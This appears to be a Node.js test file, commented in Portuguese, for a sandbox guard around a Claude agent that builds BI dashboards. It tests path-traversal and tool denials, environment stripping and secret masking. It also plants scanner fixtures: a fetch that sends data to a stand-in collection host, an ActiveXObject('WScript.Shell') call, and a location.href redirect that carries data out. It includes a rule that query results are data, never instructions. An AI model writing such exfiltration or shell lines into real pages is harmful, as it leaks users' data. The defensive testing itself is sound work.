/* Testes do construtor (servidor/construtor.js + ferramentas/construir.js), SEM gastar: um query de mentira faz o papel
   do claude.exe (passa pela guarda antes de "escrever", chama as ferramentas próprias e solta as mensagens do SDK). As
   peças tool() e createSdkMcpServer() são as do SDK de verdade (só montam o servidor MCP dentro do Node: nada liga).
   node teste/testar-construtor.js
   Com TESTE_CONSTRUTOR_REAL=1, faz também UMA construção de verdade (um mini BI com dados de exemplo, teto US$ 0,20,
   Claude Sonnet 5.5) e confere que nenhum claude.exe ficou vivo. A chave vem do ENV pelo config.js (o valor nunca é
   impresso). O banco do teste real é de mentira (dados fixos): nada toca o DATA WAREHOUSE.
   Tudo numa pasta temporária: nada vai para o OneDrive nem para o LOCALAPPDATA. A prévia NUNCA abre no Windows aqui (o
   abrirNoWindows é falso). */
import fs from 'node:fs';
import fsp from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import {
  criarConstrutor, criarGuardaProjeto, estimar, nomeProjeto, envMinimo, conferirProjeto, custoDoUso, queryDeMentira,
  lerEstilo, montarSistema, dinheiroFalado, NOMES_MCP, MODELO, CONFIG_PADRAO, GASTOS_PADRAO, motivoDaFalha, travarPaginas,
} from '../construtor.js';
import { construir, verConstrucao, pararConstrucao, listarProjetos } from '../ferramentas/construir.js';
import { executarFerramenta } from '../ferramentas/index.js';
import { decidir, tirarAvisos } from '../acoes.js';
import { conferirSql } from '../banco.js';
import { criarVault } from '../vault.js';
import { validar } from '../validar.js';

let falhas = 0, total = 0;
const ok = (cond, msg) => { total++; console.log(`${cond ? 'OK  ' : 'FALHOU'} ${msg}`); if (!cond) falhas++; };
const titulo = t => console.log(`\n== ${t}`);
const pausa = ms => new Promise(r => setTimeout(r, ms));
const recusaAsync = async (fn, rxCodigo, msg) => {
  try { await fn(); ok(false, `${msg} (não recusou)`); }
  catch (e) { ok(rxCodigo.test(e.codigo || '') , `${msg} → ${e.codigo}: ${e.message}`); }
};

const AQUI = path.dirname(fileURLToPath(import.meta.url));
const SERVIDOR = path.resolve(AQUI, '..');
const existiaConfig = fs.existsSync(CONFIG_PADRAO), existiaGastos = fs.existsSync(GASTOS_PADRAO);
const base = await fsp.mkdtemp(path.join(os.tmpdir(), 'construtor-teste-'));   // vem no formato curto (GTIJUL~1.ALV)
const baseReal = await fsp.realpath(base);
const raizJarvis = path.join(base, 'JARVIS');
const logs = [];

// variáveis que NÃO podem chegar no claude.exe (o env do SDK substitui tudo; aqui provamos que nada herda)
const ENV_ANTES = { ANTHROPIC_BASE_URL: process.env.ANTHROPIC_BASE_URL, CLAUDE_CODE_ENTRYPOINT: process.env.CLAUDE_CODE_ENTRYPOINT, CLAUDE_CODE_SSE_PORT: process.env.CLAUDE_CODE_SSE_PORT };
process.env.ANTHROPIC_BASE_URL = 'http://127.0.0.1:9/desvio';
process.env.CLAUDE_CODE_ENTRYPOINT = 'teste-herdado';
process.env.CLAUDE_CODE_SSE_PORT = '1';

/* ---------- peças falsas ---------- */
function pastaFalsa(raiz) {
  const ids = new Map();
  return {
    raiz, abertos: [],
    async garantir(sub) { const d = path.join(raiz, sub); await fsp.mkdir(d, { recursive: true }); return d; },
    registrar(abs) { const id = 'arq_' + crypto.randomBytes(8).toString('base64url'); ids.set(id, abs); return id; },
    porId(id) { return ids.get(id) || null; },
    async abrirNoWindows(abs, o) { this.abertos.push({ abs, o }); },
  };
}
const pasta = pastaFalsa(raizJarvis);
const bancoFalso = {
  configurado: true, consultas: [],
  async consultar(sql) {
    conferirSql(sql);   // a mesma trava de texto do Jarvis (financeiro fora, só SELECT)
    this.consultas.push(sql);
    return { colunas: ['filial', 'venda'], linhas: [['1', 1200000], ['7', 640000], ['10', 410000]], linhas_devolvidas: 3, mais_linhas: false, schemas: ['comercial'] };
  },
  async descrever() { return { schemas: { comercial: ['venda_filial'] } }; },
};
const JPEG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.from('JFIF de teste'), Buffer.from([0xff, 0xd9])]);
const navegadorFalso = { chamadas: [], async printArquivo(abs, o) { this.chamadas.push({ abs, o }); return { buf: JPEG, erros: [] }; } };

// um vault de mentira com as duas notas de estilo
const vaultDir = path.join(base, 'vault');
await fsp.mkdir(path.join(vaultDir, 'Preferências'), { recursive: true });
await fsp.writeFile(path.join(vaultDir, 'Preferências', 'Como eu gosto dos BIs.md'),
  '# Como eu gosto dos BIs\n\n## Organização\nnada\n\n## Estilo visual\n\n### Padrão dos sistemas\n- Cores: fundo `#050b1c`, azul da marca `#2a41c8`, vermelho `#e5202c`.\n- Botão principal vermelho, ver [[BI COMPRAS]].\n- senha=nao-deveria-estar-aqui\n\n## Gráficos e números\nfora do trecho\n', 'utf8');
await fsp.writeFile(path.join(vaultDir, 'Preferências', 'Identidade visual da Lube.md'),
  '# Identidade visual da Lube\n\n## Logo\nplaca branca\n\n## Cores (medidas na logo)\n- Azul Lube `#0D176E`.\n\n## Formas e letras\n- Plus Jakarta Sans 800.\n\n## Onde já foi usada\nfora\n', 'utf8');
const vault = criarVault(vaultDir);

const PEDIDO = 'Um BI de vendas por filial com um cartão de total, uma tabela e um gráfico de barras. senha=Segredo123 não pode ir.';
const HTML_OK = '<!doctype html><html lang="pt-BR"><head><meta charset="utf-8"><title>Vendas</title>'
  + '<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script><script src="dados.js"></script></head>'
  + '<body><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"></svg><canvas id="g"></canvas></body></html>';

const hojeSP = new Intl.DateTimeFormat('sv-SE', { timeZone: 'America/Sao_Paulo', year: 'numeric', month: '2-digit', day: '2-digit' }).format(new Date());

/* O query de mentira: roteiro é um gerador assíncrono que recebe as ferramentas do jeito que o claude.exe usaria. */
function criarFalso(roteiro) {
  const chamadas = [];
  const query = ({ prompt, options }, extras = {}) => {
    const st = { interrompido: false, fechado: false, ordem: [] };
    const guarda = options.hooks.PreToolUse[0].hooks[0];
    const ferramentas = extras.ferramentas || [];
    const chamar = (nome, args) => ferramentas.find(f => f.nome === nome).handler(args);
    const escrever = async (rel, conteudo) => {
      const fp = path.isAbsolute(rel) ? rel : path.join(options.cwd, rel);
      const r = await guarda({ hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: fp, content: conteudo }, tool_use_id: 't' });
      const negado = r?.hookSpecificOutput?.permissionDecision === 'deny';
      if (!negado) { await fsp.mkdir(path.dirname(fp), { recursive: true }); await fsp.writeFile(fp, conteudo, 'utf8'); }
      return !negado;
    };
    const it = roteiro({ prompt, options, ferramentas, guarda, escrever, chamar, st });
    chamadas.push({ prompt, options, st, extras });
    it.interrupt = async () => { st.ordem.push('interrupt'); st.interrompido = true; };
    it.close = () => { st.ordem.push('close'); st.fechado = true; };
    return it;
  };
  return { query, chamadas };
}
const assistente = (id, blocos, usage = { input_tokens: 10, output_tokens: 10 }) => ({ type: 'assistant', message: { id, content: blocos, usage } });
const usuario = () => ({ type: 'user', message: { content: [{ type: 'tool_result', content: 'ok' }] } });
const resultado = (subtype, extra = {}) => ({ type: 'result', subtype, is_error: subtype !== 'success', num_turns: 5, total_cost_usd: 0.02, permission_denials: [], modelUsage: {}, ...extra });

let nG = 0;
function novoK(roteiro, extra = {}) {
  const falso = criarFalso(roteiro);
  const ev = [], av = [];
  const k = criarConstrutor({
    cfg: { anthropic: { apiKey: 'chave-de-teste' } }, pasta, banco: bancoFalso, vault, navegador: navegadorFalso,
    emitir: (aba, e, d) => ev.push({ aba, e, d: structuredClone(d), t: Date.now() }),
    avisar: (aba, t) => av.push({ aba, t }),
    log: (...a) => logs.push(a.join(' ')),
    sdk: { query: falso.query },
    gastosArquivo: path.join(base, 'gastos', `gastos-${++nG}.json`), configDir: path.join(base, 'config-claude'),
    ...extra,
  });
  return { k, falso, ev, av };
}
async function construirCom(k, { nome, tamanho = 'pequeno', alterar = false, aba = 'aba-teste', pedido = PEDIDO, teto = null }) {
  const p = await k.preparar({ tipo: 'bi', nome, pedido, tamanho, alterar });
  const r = await k.iniciar({ projeto: p.projeto, tipo: p.tipo, pedido: p.pedido, teto_usd: teto ?? p.teto_usd, aba, tamanho: p.tamanho, novo: p.novo });
  return { p, r };
}
async function esperarFim(k, id, ms = 15000) {
  const t0 = Date.now();
  while (Date.now() - t0 < ms) {
    const e = k.estado();
    if (!e.ativa && e.ultimas[0]?.id === id) return e.ultimas[0];
    await pausa(30);
  }
  return null;
}
async function esperarEstado(k, estado, ms = 5000) {
  const t0 = Date.now();
  while (Date.now() - t0 < ms) { if (k.estado().ativa?.estado === estado) return true; await pausa(20); }
  return false;
}

try {
  /* ---------------------------------------------------------------- contas */
  titulo('estimar e o nome do projeto');
  const e1 = estimar({ tamanho: 'pequeno' }), e2 = estimar({ tamanho: 'medio' }), e3 = estimar({ tamanho: 'grande' });
  ok(e1.estimativa_usd === 0.13 && e1.teto_usd === 0.4 && e1.maxTurns === 30 && e1.minutos === 10, `pequeno: ~US$ 0,13, teto 0,40, 30 passos, 10 min (${JSON.stringify(e1)})`);
  ok(e2.estimativa_usd === 0.32 && e2.teto_usd === 0.9 && e2.maxTurns === 75 && e2.minutos === 20, `medio: ~US$ 0,32, teto 0,90, 75 passos, 20 min (${JSON.stringify(e2)})`);
  ok(e3.estimativa_usd === 0.78 && e3.teto_usd === 2 && e3.maxTurns === 175 && e3.minutos === 40, `grande: ~US$ 0,78, teto 2,00, 175 passos, 40 min (${JSON.stringify(e3)})`);
  const e4 = estimar({ tamanho: 'medio', alterar: true });
  ok(e4.estimativa_usd === 0.23 && e4.teto_usd === 0.6, `alterar um medio: × 0,7 → ~US$ 0,23, teto 0,60 (${JSON.stringify(e4)})`);
  try { estimar({ tamanho: 'enorme' }); ok(false, 'tamanho inválido (não recusou)'); } catch (e) { ok(e.codigo === 'construtor-tamanho', 'tamanho inválido é recusado'); }
  try { estimar({ tamanho: 'constructor' }); ok(false, 'tamanho "constructor" (não recusou)'); } catch (e) { ok(e.codigo === 'construtor-tamanho', 'tamanho "constructor" (do protótipo) é recusado'); }
  ok(nomeProjeto('Vendas por Filial — Outubro') === 'vendas-por-filial-outubro', 'nome vira pasta: vendas-por-filial-outubro');
  ok(nomeProjeto('Ação & Reposição') === 'acao-reposicao', 'acento e símbolo saem: acao-reposicao');
  ok(nomeProjeto('CON') === 'con-projeto' && nomeProjeto('lpt1') === 'lpt1-projeto', 'nome reservado do Windows ganha -projeto');
  ok(nomeProjeto('..\\..\\Windows\\System32') === 'windows-system32', 'caminho no nome vira só letras e hífen');
  try { nomeProjeto('..'); ok(false, 'nome ".." (não recusou)'); } catch (e) { ok(e.codigo === 'construtor-nome', 'nome sem letras é recusado'); }
  ok(nomeProjeto('x'.repeat(80)).length === 40, 'nome cortado em 40 caracteres');
  ok(Math.abs(custoDoUso({ input_tokens: 1e6 }) - 2) < 1e-9 && Math.abs(custoDoUso({ output_tokens: 1e6 }) - 10) < 1e-9
    && Math.abs(custoDoUso({ cache_read_input_tokens: 1e6 }) - 0.2) < 1e-9 && Math.abs(custoDoUso({ cache_creation_input_tokens: 1e6 }) - 2.5) < 1e-9,
  'gasto ao vivo com o preço do Sonnet 5.5 (2 / 10 / 0,20 / 2,50 por milhão)');
  ok(dinheiroFalado(0.34) === '34 centavos de dólar' && dinheiroFalado(1.2) === '1 dólar e 20 centavos' && dinheiroFalado(0.001) === 'menos de um centavo de dólar', 'custo do jeito que se fala');

  /* ---------------------------------------------------------------- a guarda */
  titulo('a guarda (gancho PreToolUse): os casos do §1.1 e mais');
  const projG = path.join(base, 'Projetos-guarda', 'site');
  const fora = path.join(base, 'fora');
  await fsp.mkdir(projG, { recursive: true });
  await fsp.mkdir(fora, { recursive: true });
  await fsp.writeFile(path.join(fora, 'segredo.txt'), 'x');
  let temJuncao = false;
  try { execFileSync('cmd', ['/c', 'mklink', '/J', path.join(projG, 'atalho'), fora], { stdio: 'ignore', windowsHide: true }); temJuncao = true; } catch (_) { /* sem mklink */ }
  const g = criarGuardaProjeto(projG);
  const ev = (tool_name, tool_input) => g({ hook_event_name: 'PreToolUse', tool_name, tool_input, tool_use_id: 't' });
  const projGReal = await fsp.realpath(projG);
  const casos = [
    ['Write', { file_path: path.join(projG, 'index.html'), content: 'x' }, true, 'Write de index.html dentro'],
    ['Write', { file_path: 'css/estilo.css', content: 'x' }, true, 'Write relativo dentro (css/estilo.css)'],
    ['Read', { file_path: path.join(projG, '..', '..', 'fora', 'segredo.txt') }, false, 'Read com .. saindo'],
    ['Read', { file_path: path.join(fora, 'segredo.txt') }, false, 'Read de fora'],
    ['Write', { file_path: '..\\..\\fora\\x.txt', content: 'x' }, false, 'Write ..\\..\\fora'],
    ['Edit', { file_path: 'C:\\Windows\\win.ini', old_string: 'a', new_string: 'b' }, false, 'Edit em C:\\Windows'],
    ['Read', { file_path: '\\\\servidor\\share\\a.txt' }, false, 'Read de rede (\\\\servidor)'],
    ['Write', { file_path: 'index.html:fluxo', content: 'x' }, false, 'Write em fluxo alternativo (arquivo:x)'],
    ['Glob', { pattern: '**/*.html' }, true, 'Glob relativo'],
    ['Glob', { pattern: '../**/*' }, false, 'Glob ../**'],
    ['Glob', { pattern: 'C:/Users/**' }, false, 'Glob com letra de disco'],
    ['Grep', { pattern: 'senha', path: 'C:\\Users' }, false, 'Grep fora'],
    ['Grep', { pattern: 'x' }, true, 'Grep dentro'],
    ['Bash', { command: 'dir' }, false, 'Bash'],
    ['WebFetch', { url: 'https://example.com' }, false, 'WebFetch'],
    ['mcp__lube__consultar_dados', { sql: 'select 1' }, true, 'ferramenta própria mcp__lube__'],
    ['mcp__outro__x', {}, false, 'MCP de outro servidor'],
    ['Read', { file_path: projGReal.replace(/^C:\\Users\\gti\.julio\.alves/i, 'C:\\Users\\GTIJUL~1.ALV') + '\\index.html' }, true, 'caminho curto 8.3 contra a raiz no formato curto'],
    // mais do §7.3
    ['Write', { file_path: 'app.bat', content: 'x' }, false, 'Write de .bat'],
    ['Write', { file_path: 'a.ps1', content: 'x' }, false, 'Write de .ps1'],
    ['Write', { file_path: 'x.exe', content: 'x' }, false, 'Write de .exe'],
    ['Write', { file_path: 'LEIA', content: 'x' }, false, 'Write sem extensão'],
    ['Write', { file_path: 'x.bat.', content: 'x' }, false, 'Write de "x.bat." (o Windows tiraria o ponto)'],
    ['Write', { file_path: 'node_modules/x.js', content: 'x' }, false, 'Write em node_modules'],
    ['Write', { file_path: 'node_modules./x.js', content: 'x' }, false, 'Write em "node_modules." (o Windows tiraria o ponto)'],
    ['Write', { file_path: '.git/x.txt', content: 'x' }, false, 'Write em .git'],
    ['Write', { file_path: '.claude/settings.json', content: '{}' }, false, 'Write em .claude'],
    ['Read', { file_path: 'node_modules/a.js' }, false, 'Read em node_modules'],
    ['Write', { file_path: 'grande.html', content: 'x'.repeat(2 * 1024 * 1024 + 1) }, false, 'Write maior que 2 MB'],
    ['Edit', { file_path: 'index.html', old_string: 'a', new_string: 'x'.repeat(2 * 1024 * 1024 + 1) }, false, 'Edit maior que 2 MB'],
    ['Write', { file_path: projG, content: 'x' }, false, 'Write na própria pasta'],
    ['Read', {}, false, 'Read sem file_path'],
    ['constructor', {}, false, 'ferramenta "constructor" (do protótipo)'],
    ['__proto__', {}, false, 'ferramenta "__proto__"'],
    ['Glob', { pattern: '{..,x}/*' }, false, 'Glob com chaves {..,x}'],
    ['Glob', { pattern: '~/*' }, false, 'Glob com ~'],
    ['Grep', { pattern: 'x', glob: '../*' }, false, 'Grep com filtro ../*'],
    ['Read', { file_path: '\\Windows\\win.ini' }, false, 'Read de \\Windows (raiz do disco sem letra)'],
    ['Read', { file_path: '\\\\?\\C:\\Windows\\win.ini' }, false, 'Read de \\\\?\\C:\\'],
    ['Read', { file_path: 'a\0b.html' }, false, 'caminho com \\0'],
    ['Agent', { prompt: 'x' }, false, 'Agent'],
    ['NotebookEdit', {}, false, 'NotebookEdit'],
  ];
  if (temJuncao) casos.push(
    ['Read', { file_path: path.join(projG, 'atalho', 'segredo.txt') }, false, 'Read por uma junção que aponta para fora'],
    ['Write', { file_path: 'atalho/novo.txt', content: 'x' }, false, 'Write por uma junção que aponta para fora'],
  );
  for (const [t, i, deixa, desc] of casos) {
    const r = await ev(t, i);
    const deixou = !(r.hookSpecificOutput && r.hookSpecificOutput.permissionDecision === 'deny');
    ok(deixou === deixa, `${desc}: ${deixou ? 'deixou' : `negou (${r.hookSpecificOutput.permissionDecisionReason})`}`);
  }
  if (!temJuncao) console.log('(junção não testada: mklink indisponível)');
  // a raiz no formato longo e o arquivo no curto também
  const gLonga = criarGuardaProjeto(projGReal);
  const rCurto = await gLonga({ hook_event_name: 'PreToolUse', tool_name: 'Read', tool_input: { file_path: path.join(projG, 'index.html') } });
  ok(!rCurto.hookSpecificOutput, `raiz no formato longo, arquivo no curto (${projG.includes('~') ? 'curto de verdade' : 'sem 8.3 nesta máquina'}): deixou`);
  ok(Object.keys(await g({ hook_event_name: 'PostToolUse', tool_name: 'Bash' })).length === 0, 'evento que não é PreToolUse: nada a fazer');
  let chamouTeto = 0;
  const gTeto = criarGuardaProjeto(projG, { custo: () => 0.37, teto: 0.4, aoTeto: () => chamouTeto++ });
  const rT1 = await gTeto({ hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: 'b.html', content: 'x' } });
  const rT2 = await gTeto({ hook_event_name: 'PreToolUse', tool_name: 'Read', tool_input: { file_path: 'b.html' } });
  ok(rT1.hookSpecificOutput?.permissionDecision === 'deny' && /teto/.test(rT1.hookSpecificOutput.permissionDecisionReason) && chamouTeto === 1, 'teto suave (90%): Write negado e aoTeto chamado');
  ok(!rT2.hookSpecificOutput, 'teto suave: Read continua liberado');
  try { if (temJuncao) fs.rmdirSync(path.join(projG, 'atalho')); } catch (_) { /* nada */ }

  /* ---------------------------------------------------------------- env e conferência */
  titulo('o ambiente do claude.exe e a conferência do fim');
  const envT = envMinimo({ configDir: 'C:\\cfg', apiKey: 'k', base: { SystemRoot: 'C:\\Windows', TEMP: 'C:\\T', TMP: 'C:\\T', USERPROFILE: 'C:\\U', LOCALAPPDATA: 'C:\\L', APPDATA: 'C:\\A', ANTHROPIC_BASE_URL: 'http://x', CLAUDE_CODE_ENTRYPOINT: 'x', PATH: 'C:\\Program Files\\Git\\bin', NODE_OPTIONS: '--x' } });
  const PERMITIDAS = new Set(['SystemRoot', 'windir', 'ComSpec', 'PATH', 'TEMP', 'TMP', 'USERPROFILE', 'LOCALAPPDATA', 'APPDATA', 'CLAUDE_CONFIG_DIR', 'ANTHROPIC_API_KEY', 'CLAUDE_AGENT_SDK_CLIENT_APP', 'CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC', 'DISABLE_AUTOUPDATER']);
  ok(Object.keys(envT).every(k => PERMITIDAS.has(k)), `env só com as variáveis da lista (${Object.keys(envT).length})`);
  ok(!('ANTHROPIC_BASE_URL' in envT) && !('CLAUDE_CODE_ENTRYPOINT' in envT) && !('NODE_OPTIONS' in envT), 'env sem ANTHROPIC_BASE_URL, CLAUDE_CODE_ENTRYPOINT e NODE_OPTIONS herdados');
  ok(envT.PATH === 'C:\\Windows\\System32;C:\\Windows;C:\\Windows\\System32\\WindowsPowerShell\\v1.0', 'PATH mínimo (System32, Windows, PowerShell; sem Git)');
  ok(!('ANTHROPIC_API_KEY' in envMinimo({ configDir: 'C:\\cfg', apiKey: undefined, base: {} })), 'sem chave, a variável nem aparece');

  const projC = path.join(base, 'conferir');
  await fsp.mkdir(path.join(projC, 'js'), { recursive: true });
  await fsp.writeFile(path.join(projC, 'index.html'), HTML_OK);
  ok((await conferirProjeto(projC)).avisos.length === 0, 'conferência: cdnjs e o namespace do SVG (w3.org) passam');
  await fsp.writeFile(path.join(projC, 'js', 'app.js'), "const u = '//evil.example.com/x';\nfetch('https://coleta.example.net/?d=' + 1);\nnew ActiveXObject('WScript.Shell');");
  await fsp.writeFile(path.join(projC, 'pagina.html'), '<img src="//rastreio.example.org/p.gif">');
  await fsp.writeFile(path.join(projC, 'rodar.bat'), 'echo x');
  const conf = await conferirProjeto(projC);
  ok(conf.avisos.some(a => /coleta\.example\.net/.test(a)), 'conferência: endereço de fora');
  ok(conf.avisos.some(a => /rastreio\.example\.org/.test(a)), 'conferência: endereço sem esquema (//host)');
  ok(conf.avisos.some(a => /fetch/.test(a)), 'conferência: fetch');
  ok(conf.avisos.some(a => /ActiveXObject|WScript/.test(a)), 'conferência: ActiveXObject/WScript');
  ok(conf.avisos.some(a => /rodar\.bat/.test(a)), 'conferência: arquivo que executa (.bat)');
  const projN = path.join(base, 'conferir-navega');
  await fsp.mkdir(projN, { recursive: true });
  await fsp.writeFile(path.join(projN, 'index.html'), HTML_OK + "<script>const a = 'ht' + 'tps://'; location.href = a + 'x.example' + '/?d=' + DADOS;</script>");
  await fsp.writeFile(path.join(projN, 'abas.js'), "location.hash = '#vendas'; if (location.href === 'x') {}");
  const confN = await conferirProjeto(projN);
  ok(confN.avisos.some(a => /index\.html muda de página/.test(a)) && !confN.avisos.some(a => /abas\.js/.test(a)), `conferência: endereço montado em pedaços e location.href = … (mudar de página) entram; location.hash e a comparação não (${confN.avisos.join(' | ')})`);
  ok((await travarPaginas(projN)) === 1 && /data-jarvis="trava"/.test(fs.readFileSync(path.join(projN, 'index.html'), 'utf8')) && (await travarPaginas(projN)) === 0, 'travarPaginas: a trava entra uma vez em cada página (a segunda volta não muda nada)');
  const htmlTravado = fs.readFileSync(path.join(projN, 'index.html'), 'utf8');
  ok(/connect-src 'none'/.test(htmlTravado) && /form-action 'none'/.test(htmlTravado) && htmlTravado.indexOf('data-jarvis') < htmlTravado.indexOf('<script') && htmlTravado.indexOf('charset') < htmlTravado.indexOf('data-jarvis'), 'a trava fica antes de qualquer script, depois do charset, sem rede e sem formulário');
  ok((await conferirProjeto(projN)).avisos.every(a => !/fonts\.g|cdnjs|jsdelivr|unpkg/.test(a)), 'as CDNs da trava não viram aviso na conferência');
  ok(motivoDaFalha({ erro: Object.assign(new Error('getaddrinfo ENOTFOUND api.anthropic.com'), { code: 'ENOTFOUND' }) }) === 'sem internet'
    && /chave do Claude foi recusada/.test(motivoDaFalha({ resultado: { result: 'API Error: 401 {"type":"authentication_error"}' } }))
    && /sem crédito/.test(motivoDaFalha({ stderr: ['Your credit balance is too low to access the Anthropic API'] }))
    && /ocupada/.test(motivoDaFalha({ resultado: { result: 'API Error: 529 overloaded_error' } }))
    && /INICIAR\.bat/.test(motivoDaFalha({ erro: { semSdk: true } })) && motivoDaFalha({ erro: new Error('o processo caiu') }) === null,
    'motivoDaFalha: sem internet, chave recusada, sem crédito, API ocupada, SDK não instalado; o resto fica sem frase');

  /* ---------------------------------------------------------------- estilo */
  titulo('o estilo das notas no sistema do construtor');
  const estilo = await lerEstilo(vault);
  ok(/#2a41c8/.test(estilo) && /#0D176E/.test(estilo) && /Plus Jakarta/.test(estilo), 'trecho "Estilo visual" e as cores e letras da identidade');
  ok(!/fora do trecho/.test(estilo) && !/placa branca/.test(estilo), 'só as seções certas (nem "Gráficos e números", nem "Logo")');
  ok(!/\[\[/.test(estilo) && /BI COMPRAS/.test(estilo), '[[links]] viram texto');
  ok(!/nao-deveria-estar-aqui/.test(estilo), 'segredo nas notas sai mascarado');
  ok(/só na pasta atual/.test(montarSistema(estilo)) && /#2a41c8/.test(montarSistema(estilo)), 'o sistema leva as regras de ferro e o estilo');
  ok(/#050b1c/.test(montarSistema('')), 'sem as notas, o sistema usa o padrão dos sistemas da Lube');

  /* ---------------------------------------------------------------- construção que dá certo */
  titulo('construção que dá certo (query de mentira, peças do SDK de verdade)');
  const A = novoK(async function* ({ escrever, chamar, st, options }) {
    yield { type: 'system', subtype: 'init', tools: options.tools };
    await chamar('andamento', { etapa: 'Montando a tabela' });
    yield assistente('m1', [{ type: 'tool_use', name: 'mcp__lube__andamento', input: { etapa: 'Montando a tabela' } }], { input_tokens: 4500, output_tokens: 120 });
    yield usuario();
    st.dados = await chamar('consultar_dados', { sql: 'select filial, sum(venda) from comercial.venda_filial group by 1' });
    st.financeiro = await chamar('consultar_dados', { sql: 'select * from financeiro.folha' });
    st.descrever = await chamar('descrever_dados', { schema: 'comercial' });
    st.nota = await chamar('ler_nota', { nome: 'Identidade visual da Lube' });
    yield assistente('m2', [{ type: 'tool_use', name: 'Write', input: { file_path: path.join(options.cwd, 'index.html') } }], { cache_read_input_tokens: 4500, output_tokens: 900 });
    st.escreveuIndex = await escrever('index.html', HTML_OK);
    st.escreveuDados = await escrever('dados.js', 'const DADOS = { geradoEm: "2026-10-20 15:00", linhas: [] };');
    st.escreveuFora = await escrever(path.join(fora, 'fora.html'), 'x');
    yield usuario();
    await pausa(300);
    st.previa = await chamar('ver_previa', {});
    st.previaFora = await chamar('ver_previa', { arquivo: '..\\..\\fora\\x.html' });
    yield resultado('success', { is_error: false, num_turns: 7, total_cost_usd: 0.0335, result: 'Fiz o BI.' });
  });
  const pastaAntes = pasta.abertos.length;
  const { p: pA, r: rA } = await construirCom(A.k, { nome: 'Vendas por filial', aba: 'aba-A' });
  ok(pA.projeto === 'vendas-por-filial' && pA.novo === true && pA.estimativa_usd === 0.13 && pA.teto_usd === 0.4 && pA.resta_hoje_usd === 10, `preparar: ${pA.projeto}, ~US$ ${pA.estimativa_usd}, teto ${pA.teto_usd}, resta hoje ${pA.resta_hoje_usd}`);
  ok(!/Segredo123/.test(pA.pedido) && /\[oculto\]/.test(pA.pedido), 'o pedido sai com a senha mascarada');
  const fimA = await esperarFim(A.k, rA.id);
  const chA = A.falso.chamadas[0];
  const o = chA.options;
  const projAReal = await fsp.realpath(path.join(raizJarvis, 'Projetos', 'vendas-por-filial'));
  ok(o.verbatimPrompts === true, 'opções: verbatimPrompts: true (o @caminho não fura a guarda)');
  ok(Array.isArray(o.settingSources) && o.settingSources.length === 0 && Array.isArray(o.skills) && o.skills.length === 0, 'opções: settingSources [] e skills []');
  ok(o.strictMcpConfig === true && o.persistSession === false && o.permissionMode === 'dontAsk', 'opções: strictMcpConfig, persistSession false, permissionMode dontAsk');
  ok(o.model === MODELO && MODELO === 'claude-sonnet-5-5' && o.effort === 'medium', 'opções: claude-sonnet-5-5, effort medium');
  ok(JSON.stringify(o.tools) === JSON.stringify(['Read', 'Write', 'Edit', 'Glob', 'Grep']), 'opções: tools só Read, Write, Edit, Glob, Grep (sem Bash)');
  ok(JSON.stringify(o.allowedTools) === JSON.stringify(['Read', 'Write', 'Edit', 'Glob', 'Grep', ...NOMES_MCP]) && NOMES_MCP.length === 5, 'opções: allowedTools = as 5 de arquivo + as 5 mcp__lube__');
  ok(['Bash', 'WebFetch', 'WebSearch', 'Agent', 'Task', 'NotebookEdit', 'Skill'].every(x => o.disallowedTools.includes(x)), 'opções: disallowedTools com Bash, WebFetch, WebSearch, Agent, Task, NotebookEdit, Skill');
  ok(o.maxBudgetUsd === 0.32 && o.maxTurns === 30, `opções: maxBudgetUsd = 80% do teto (${o.maxBudgetUsd}) e maxTurns ${o.maxTurns}`);
  ok(o.cwd.toLowerCase() === projAReal.toLowerCase(), 'opções: cwd = a pasta do projeto (caminho real)');
  ok(Object.keys(o.env).every(k => PERMITIDAS.has(k)) && o.env.ANTHROPIC_API_KEY === 'chave-de-teste' && !('ANTHROPIC_BASE_URL' in o.env) && !('CLAUDE_CODE_ENTRYPOINT' in o.env) && !('CLAUDE_CODE_SSE_PORT' in o.env),
    'opções: env mínimo, com a chave e sem ANTHROPIC_BASE_URL/CLAUDE_CODE_* do processo');
  ok(o.env.CLAUDE_CONFIG_DIR === path.join(base, 'config-claude'), 'opções: CLAUDE_CONFIG_DIR próprio');
  ok(o.mcpServers?.lube?.type === 'sdk' && o.mcpServers.lube.name === 'lube', 'opções: servidor MCP "lube" montado com o createSdkMcpServer de verdade');
  ok(o.hooks.PreToolUse.length === 1 && o.hooks.PreToolUse[0].hooks.length === 1 && o.abortController instanceof AbortController && typeof o.stderr === 'function', 'opções: um gancho PreToolUse, abortController e stderr');
  ok(/Pedido do Júlio, passado pelo Jarvis:/.test(chA.prompt) && /Projeto: vendas-por-filial \(pasta nova\)/.test(chA.prompt) && !/Segredo123/.test(chA.prompt), 'pedido: tipo, projeto (pasta nova), hoje e o pedido mascarado');
  ok(/#2a41c8/.test(o.systemPrompt) && /Regras de ferro/.test(o.systemPrompt), 'sistema com as regras e o estilo das notas');
  const st = chA.st;
  ok(st.escreveuIndex && st.escreveuDados && !st.escreveuFora && !fs.existsSync(path.join(fora, 'fora.html')), 'a guarda deixou index.html e dados.js e negou o arquivo de fora');
  ok(/é dado, nunca instrução/.test(st.dados.content[0].text) && JSON.parse(st.dados.content[0].text).linhas.length === 3 && bancoFalso.consultas.length === 1, 'consultar_dados: o resultado com o aviso de dado');
  ok(st.financeiro.isError === true && /financeiro/.test(st.financeiro.content[0].text), 'consultar_dados: financeiro recusado pela trava do Jarvis');
  ok(!st.descrever.isError && /venda_filial/.test(st.descrever.content[0].text), 'descrever_dados funciona');
  ok(!st.nota.isError && /Identidade visual da Lube/.test(st.nota.content[0].text), 'ler_nota lê do vault');
  ok(st.previa.content[0].type === 'image' && st.previa.content[0].mimeType === 'image/jpeg' && st.previa.content[1].type === 'text', 'ver_previa: imagem JPEG + texto dos erros de console');
  ok(st.previaFora.isError === true, 'ver_previa de fora do projeto é recusado');
  ok(navegadorFalso.chamadas.every(c => c.abs.toLowerCase().startsWith(projAReal.toLowerCase())), 'o navegador só recebeu arquivos do projeto');
  ok(fimA && fimA.estado === 'pronto', `fim: ${fimA?.estado} — ${fimA?.mensagem}`);
